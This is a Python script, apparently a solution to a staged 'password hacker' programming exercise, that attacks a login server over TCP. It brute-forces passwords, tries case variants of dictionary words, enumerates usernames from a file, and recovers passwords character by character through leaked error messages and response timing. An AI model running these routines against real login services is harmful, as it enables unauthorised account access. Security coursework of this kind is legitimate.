import sys,os
import socket
import itertools
import json
from time import time
#=========================================================================================
#DEFINICAO DE
if len(sys.argv)>=3:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    PORT=int(PORT)
else:
    HOST = "127.0.0.1"
    PORT = 9090
dest = (HOST, PORT)
cwd = os.getcwd()


#============================================================================================
# 2x 5
def forca_bruta():
    lista = [chr(i) for i in range(97, 123)]
    lista.extend([chr(i) for i in range(48, 58)])
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
        servidor.connect(dest)
        cont, contador2, resultado = 0, 0, True
        while resultado:
            cont += 1
            matrix = list(itertools.product(lista, repeat=6))
            for i in matrix:
                contador2 += 1
                PASSWD = ''.join(i)
                servidor.sendall(PASSWD.encode())
                resposta = servidor.recv(1024)
                MSG = resposta.decode()
                print(MSG)
                if MSG.find("Too") >= 0 or MSG.find("Connection") >= 0 or contador2 > 1_000_000:
                    resultado = False
                    break

            # if cont>1 : break
        if MSG.find("Connection") >= 0:
            print(PASSWD)
        else:
            print(MSG)



#=========================================================================================
# 3x 5
def arquivo_password():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
        servidor.connect(dest)
        linha,contador2, resultado = 0,0, True
        with open(f"{cwd}/password.txt", "r") as f:
            while linha!='' and resultado:
                linha = f.readline().strip()
                if linha.isdigit()==True:
                    matrix=[str(linha)]
                else:
                    matrix = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] \
                            for letter in linha ))))
                for i in matrix:
                    contador2 +=1
                    PASSWD = ''.join(i)
                    servidor.sendall(PASSWD.encode())
                    resposta = servidor.recv(1024)
                    MSG=resposta.decode()
                    if MSG.find("Too")>=0 or MSG.find("Connection")>=0 or contador2 >1_000_000:
                        resultado=False
                        break

            if MSG.find("Connection")>=0 :
                print(PASSWD)
            else:
                print(MSG)
#=========================================================================================
# 4x 5
def teste_4_5():
    dicionario={"login":'',"password":''}
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
        servidor.connect(dest)
        linha,contador2, resultado = 0,0, True
        with open(f"{cwd}/login.txt", "r") as f:
            while linha!='' and resultado:
                linha = f.readline().strip()
                matrix = [str(linha)]
                '''
                if linha.isdigit()==True:
                    matrix=[str(linha)]
                else:
                    matrix = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] \
                            for letter in linha ))))
                '''
                for i in matrix:
                    contador2 +=1
                    dicionario["login"]=''.join(i)
                    LOGIN=json.dumps(dicionario)
                    servidor.sendall(LOGIN.encode())
                    resposta = servidor.recv(1024)
                    retorno=json.loads(resposta.decode())
                    MSG_LOG=retorno["result"]
                    if MSG_LOG.find("Too")>=0 or MSG_LOG.find("password")>=0 or contador2 >1_000_000:
                        resultado=False
                        break
                    elif MSG_LOG.find("Bad")>=0:
                        print("Erro de Formatacao")
                        raise Exception
                    #print(MSG_LOG)
    #=======PASSWORD=========
        if MSG_LOG.find("password")>=0 :
            cont, contador2, resultado = 0, 0, True
            lista = [chr(i) for i in range(97, 123)]
            lista.extend([chr(i) for i in range(65, 91)])
            lista.extend([chr(i) for i in range(48, 58)])
            senha=""
            while resultado:
                cont += 1
                matrix = list(map(lambda x: senha+"".join(x),lista))
                for i in matrix:
                    contador2 += 1
                    dicionario["password"]= ''.join(i)
                    LOGIN = json.dumps(dicionario)
                    servidor.sendall(LOGIN.encode())
                    resposta = servidor.recv(1024)
                    retorno = json.loads(resposta.decode())
                    MSG_PASSWD = retorno["result"]
                    if MSG_PASSWD.find("Too") >= 0 or MSG_PASSWD.find("Connection") >= 0 or contador2 > 1_000_000:
                        resultado = False
                        break
                    elif MSG_PASSWD.find("Exception")>=0:
                        senha=''.join(i)
                        #print(dicionario)
                        cont+=1
                        break
                    elif MSG_PASSWD.find("Bad")>=0:
                        print("Erro de Formatacao")
                        raise Exception

                # if cont>1 : break
            if MSG_PASSWD.find("Connection") >= 0:
                print(json.dumps(dicionario))

            else:
                print(MSG_PASSWD)
#=========================================================================================
# 5x 5
dicionario = {"login": '', "password": ''}
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as servidor:
    servidor.connect(dest)
    linha, contador2, resultado = 0, 0, True
    with open(f"{cwd}/login.txt", "r") as f:
        while linha != '' and resultado:
            linha = f.readline().strip()
            matrix = [str(linha)]
            for i in matrix:
                contador2 += 1
                dicionario["login"] = ''.join(i)
                LOGIN = json.dumps(dicionario)
                servidor.sendall(LOGIN.encode())
                resposta = servidor.recv(1024)
                retorno = json.loads(resposta.decode())
                MSG_LOG = retorno["result"]
                if MSG_LOG.find("Too") >= 0 or MSG_LOG.find("password") >= 0 or contador2 > 1_000_000:
                    resultado = False
                    break
                elif MSG_LOG.find("Bad") >= 0:
                    print("Erro de Formatacao")
                    raise Exception
                # print(MSG_LOG)
    # =======PASSWORD=========
    if MSG_LOG.find("password") >= 0:
        contador2, resultado = 0, True
        lista = [chr(i) for i in range(97, 123)]
        lista.extend([chr(i) for i in range(65, 91)])
        lista.extend([chr(i) for i in range(48, 58)])
        senha = ""

        diferenca=-1
        while resultado:
            matrix = list(map(lambda x: senha + "".join(x), lista))
            for i in matrix:
                start = time()
                contador2 += 1
                dicionario["password"] = ''.join(i)
                LOGIN = json.dumps(dicionario)
                servidor.sendall(LOGIN.encode())
                resposta = servidor.recv(1024)
                try:
                    retorno = json.loads(resposta.decode())
                except:
                    print(dicionario)
                    raise Exception
                    break
                MSG_PASSWD = retorno["result"]
                stop=time()
                tempo=stop-start
                if MSG_PASSWD.find("Too") >= 0 or MSG_PASSWD.find("Connection") >= 0 or len(MSG_PASSWD) <= 3 or contador2 > 1_000_000:
                    resultado = False
                    break
                elif tempo>diferenca:
                    senha = ''.join(i)
                    diferenca,tempo=tempo,diferenca
                    if MSG_PASSWD.find("password") <0:
                        resultado= False
                        break
                elif MSG_PASSWD.find("Bad") >= 0:
                    print("Erro de Formatacao")
                    raise Exception


print(json.dumps(dicionario))
